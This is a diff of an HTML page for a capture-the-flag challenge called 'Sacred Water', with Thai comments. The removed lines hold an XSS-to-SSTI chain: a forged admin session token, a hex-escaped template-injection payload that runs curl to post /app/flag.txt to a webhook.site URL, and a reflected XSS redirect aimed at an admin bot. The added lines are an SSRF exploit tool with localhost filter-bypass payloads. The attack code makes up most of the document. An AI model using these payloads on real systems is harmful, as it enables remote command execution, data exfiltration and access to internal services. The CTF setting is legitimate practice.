@@ -1,39 +1,98 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Exploit Pivot</title>
+    <meta charset="UTF-8">
+    <title>Sacred Water SSRF Exploit Tool</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; padding: 40px; }
+        .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; }
+        h2 { color: #ffca28; border-bottom: 2px solid #ffca28; padding-bottom: 10px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; color: #aaa; }
+        input { width: 100%; padding: 10px; background: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
+        button { padding: 10px 20px; background: #ffca28; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #ffd54f; }
+        .payload-list { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
+        .payload-btn { background: #333; color: #ffca28; border: 1px solid #ffca28; font-size: 12px; }
+        #result { margin-top: 20px; background: #000; padding: 15px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; color: #00ff00; border: 1px solid #00ff00; min-height: 100px; overflow-x: auto; }
+        .info { font-size: 13px; color: #888; margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <script>
-        // 1. กำหนดค่าเป้าหมาย
-        const WEBHOOK = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
-        const SCADA_API = "http://127.0.0.1:5000/api/reports/generate";
-        
-        // 2. ปลอมตัวเป็น Admin (Base64 JSON)
-        const ADMIN_TOKEN = "eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=";
 
-        // 3. SSTI Payload (Bypass WAF ด้วย Hex Encoding)
-        // คำสั่ง: cat /app/flag.txt แล้วส่งไปที่ Webhook
-        const SSTI_PAYLOAD = `{{ get_flashed_messages|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("get")("\\x6fs")|attr("\\x70open")("curl -X POST -d @/app/flag.txt ${WEBHOOK}")|attr("read")() }}`;
+<div class="container">
+    <h2>Sacred Water: SSRF Exploit Tool</h2>
+    <p>ระบบแจ้งว่า "Internal addresses are blocked" แต่เราจะใช้เทคนิค Bypass เพื่อหา Flag</p>
 
-        // 4. สร้าง Script ที่จะไปรันผ่าน XSS บน Port 3000
-        // เพื่อให้มันยิง Port 5000 จาก "ข้างใน" ได้โดยไม่ติด CORS
-        const xssScript = `
-            document.cookie = "session_token=${ADMIN_TOKEN}; path=/; domain=127.0.0.1";
-            fetch("${SCADA_API}", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                credentials: "include",
-                body: JSON.stringify({ "template": \`${SSTI_PAYLOAD}\` })
+    <div class="form-group">
+        <label>Target URL (Base Address)</label>
+        <input type="text" id="targetHost" placeholder="http://34.x.x.x:3000" value="">
+    </div>
+
+    <div class="form-group">
+        <label>SSRF Payload (Internal Resource)</label>
+        <input type="text" id="internalPath" placeholder="http://127.0.0.1/flag" value="http://127.0.0.1/flag">
+    </div>
+
+    <button onclick="runExploit()">Execute SSRF</button>
+
+    <div class="payload-list">
+        <button class="payload-btn" onclick="setPayload('http://127.0.0.1/flag')">Standard Localhost</button>
+        <button class="payload-btn" onclick="setPayload('http://localhost/flag')">Localhost Alias</button>
+        <button class="payload-btn" onclick="setPayload('http://0.0.0.0/flag')">0.0.0.0 Bypass</button>
+        <button class="payload-btn" onclick="setPayload('http://127.1/flag')">Decimal Bypass</button>
+        <button class="payload-btn" onclick="setPayload('http://[::1]/flag')">IPv6 Bypass</button>
+        <button class="payload-btn" onclick="setPayload('http://localtest.me/flag')">DNS Bypass</button>
+    </div>
+
+    <div id="result">Results will appear here...</div>
+    
+    <div class="info">
+        <strong>💡 Hint:</strong> ในโจทย์ CTF ส่วนใหญ่ Flag มักอยู่ที่ <code>/flag</code>, <code>/admin</code> หรือ <code>/api/internal/flag</code> บน localhost
+    </div>
+</div>
+
+<script>
+    function setPayload(p) {
+        document.getElementById('internalPath').value = p;
+    }
+
+    async function runExploit() {
+        const host = document.getElementById('targetHost').value.trim();
+        const internal = document.getElementById('internalPath').value.trim();
+        const resultDiv = document.getElementById('result');
+
+        if (!host) {
+            alert("กรุณาใส่ Target Host (IP ของ Server โจทย์)");
+            return;
+        }
+
+        resultDiv.textContent = "🚀 Launching SSRF Attack...";
+        resultDiv.style.color = "#00ff00";
+
+        try {
+            const response = await fetch(`${host}/api/import-catalog`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: internal })
             });
-        `;
 
-        // 5. ทำการ Redirect Admin Bot ไปที่หน้า Video ที่มีช่องโหว่ XSS (Reflected)
-        // เราใช้ "> เพื่อปิด Tag เดิมแล้วใส่ <script> ของเราเข้าไป
-        const targetUrl = `http://127.0.0.1:3000/video.html?v=featured%22%3E%3Cscript%3E${encodeURIComponent(xssScript)}%3C/script%3E`;
+            const data = await response.json();
+            
+            // แสดงผลลัพธ์ที่ดึงมาจาก SSRF
+            resultDiv.textContent = "Status: " + response.status + "\n\nResponse Content:\n" + JSON.stringify(data, null, 2);
+            
+            if (JSON.stringify(data).includes("web{")) {
+                resultDiv.style.border = "2px solid #ffca28";
+                alert("🚩 FLAG FOUND!");
+            }
 
-        console.log("Redirecting Bot to XSS Pivot...");
-        window.location.href = targetUrl;
-    </script>
+        } catch (err) {
+            resultDiv.textContent = "❌ Error: " + err.message + "\n\nตรวจสอบว่า Target Host ถูกต้องและเปิด CORS หรือไม่ (หากรันจาก Local ไฟล์)";
+            resultDiv.style.color = "#ff4444";
+        }
+    }
+</script>
+
 </body>
 </html>
